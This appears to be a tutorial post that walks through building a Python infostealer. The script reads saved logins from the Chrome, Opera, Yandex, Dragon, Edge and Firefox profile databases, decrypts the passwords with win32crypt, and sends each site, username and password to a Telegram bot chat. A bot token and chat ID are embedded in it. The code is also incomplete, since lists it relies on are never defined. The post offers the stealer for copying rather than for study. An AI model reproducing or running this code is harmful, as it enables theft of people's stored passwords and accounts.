from os import getlogin
import sqlite3
import win32crypt
import telebot

Now we need to set the variables that we need to use

t0ken = "bot:token" #1713046552:AAGGHLyqS3Ih5C4L8_wfnWehHqAX5C9xNcc
b0t = telebot.TeleBot(t0ken)
i=0
name_0f_user = getlogin()
chat_id = "1347051125"  #1347051125

Now we have to create variables with the locations of the browsers
op3ra = "C:\\Users\\" + name_0f_user + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\" + "Login data"
g00gle = "C:\\Users\\" + name_0f_user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\" + "Login Data"
yand3x = "C:\\Users\\" + name_0f_user + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\" + "Login Data"
drag0n = "C:\\Users\\" + name_0f_user + "\\AppData\\Local\\Comodo\\Dragon\\User Data\\Default\\" + "Login Data"
f1r3f0x = "C:\\Users\\" + name_0f_user + "\\AppData\\Local\\Mozilla\\Firefox\\User Data\\Default\\" + "Login Data"
edge = "C:\\Users\\" + name_0f_user + "\\AppData\\Local\\MicrosoftEdge\\User Data\\Default\\" + "Login Data"

I've added these browsers and you can add any browser of your choice like chromium 

Now we need to decipher the passwords and send that data to telegram. So we have to create a loop.
Copy and paste this
b0t.send_message(chat_id, "Name of the computer:" + name_0f_user)
for i in range(len(lsdir)):
    try:
        br0wser=lsdir[i]
        connecti0n = sqlite3.connect(br0wser)
        curs0r = connecti0n.cursor()
        curs0r.execute('SELECT origin_url, username_value, password_value FROM logins')
        for ii in curs0r.fetchall():
            d3cryptpass = win32crypt.CryptUnprotectData(ii[2])
            b0t.send_message(chat_id, lsbr0wser[i])
            b0t.send_message(chat_id, "----------------------------")
            b0t.send_message(chat_id, "Website:" + ii[0])
            b0t.send_message(chat_id, "----------------------------")
            b0t.send_message(chat_id, "Username:" + ii[1])
            b0t.send_message(chat_id, "----------------------------")
            d3cryptpass=str(d3cryptpass)
            b0t.send_message(chat_id, "Password:" + d3cryptpass)
            b0t.send_message(chat_id, "----------------------------")
    except:
        b0t.send_message(chat_id, "browser: " + lsbr0wser[i] + "wasn't installed")
